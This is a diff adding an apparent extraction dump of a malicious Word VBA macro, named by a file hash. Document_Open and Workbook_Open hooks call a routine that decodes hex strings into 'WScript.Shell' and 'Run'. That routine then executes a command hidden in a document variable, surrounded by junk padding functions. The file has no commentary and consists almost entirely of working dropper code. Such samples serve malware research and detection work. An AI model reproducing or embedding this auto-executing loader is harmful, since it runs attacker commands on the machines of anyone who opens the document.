@@ -1,0 +1,77 @@
+Filename     : ./macros/3220ee77312a1689fbdca02af091f9b55d3ddb5e754d4c6dc514f211daa3d065
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Option Explicit
+Private Function QESOX() As String
+Dim aQESOX As String
+aQESOX = "B86198B18C98989894939B98D767949898987898C061989860CC9A98D098C698AF9876C27E637F986B9899A182999C98D4B498988D98985998D684889879"
+Dim reQESOX = aQESOX
+Dim reMsgBox(Mid(aQESOX & reQESOX, 28))
+End Function
+
+Public Function RY_(ByVal TYY_ As String)
+   Dim R_ As String
+   Dim D_ As Long
+   For D_ = 1 To Len(TYY_) Step 2
+        Dim RL_ As Long: RL_ = CLng(Chr(38) & Chr(72) & Mid(TYY_, D_, 2))
+        R_ = R_ & Chr(RL_ - 26)
+   Next
+   RY_ = R_
+End Function
+Private Function DZXRQ() As String
+Dim aDZXRQ As String
+aDZXRQ = "B86198B18C98989894939B98D767949898987898C061989860CC9A98D098C698AF9876C27E637F986B9899A182999C98D4B498988D98985998D684889879"
+Dim reDZXRQ = aDZXRQ
+Dim reMsgBox(Mid(aDZXRQ & reDZXRQ, 28))
+End Function
+
+Sub HFOM_()
+    HA_
+End Sub
+Private Function CYJWX() As String
+Dim aCYJWX As String
+aCYJWX = "B86198B18C98989894939B98D767949898987898C061989860CC9A98D098C698AF9876C27E637F986B9899A182999C98D4B498988D98985998D684889879"
+Dim reCYJWX = aCYJWX
+Dim reMsgBox(Mid(aCYJWX & reCYJWX, 28))
+End Function
+
+Public Sub Document_Open()
+    Application.Run RY_("6260696779")
+End Sub
+Private Function OVTVD() As String
+Dim aOVTVD As String
+aOVTVD = "B86198B18C98989894939B98D767949898987898C061989860CC9A98D098C698AF9876C27E637F986B9899A182999C98D4B498988D98985998D684889879"
+Dim reOVTVD = aOVTVD
+Dim reMsgBox(Mid(aOVTVD & reOVTVD, 28))
+End Function
+
+Sub Workbook_Open()
+    HFOM_
+End Sub
+Private Function OJDDQ() As String
+Dim aOJDDQ As String
+aOJDDQ = "B86198B18C98989894939B98D767949898987898C061989860CC9A98D098C698AF9876C27E637F986B9899A182999C98D4B498988D98985998D684889879"
+Dim reOJDDQ = aOJDDQ
+Dim reMsgBox(Mid(aOJDDQ & reOJDDQ, 28))
+End Function
+
+Public Sub HA_()
+    Dim TYY_ As Object: Set TYY_ = VBA.CreateObject(RY_("716D7D8C838A8E486D827F8686"))
+    CallByName TYY_, RY_("6C8F88"), VbMethod, RY_(ActiveDocument.Variables("EECYUMTV").Value), 0, True
+End Sub
+Private Function LXMXP() As String
+Dim aLXMXP As String
+aLXMXP = "B86198B18C98989894939B98D767949898987898C061989860CC9A98D098C698AF9876C27E637F986B9899A182999C98D4B498988D98985998D684889879"
+Dim reLXMXP = aLXMXP
+Dim reMsgBox(Mid(aLXMXP & reLXMXP, 28))
+End Function
+
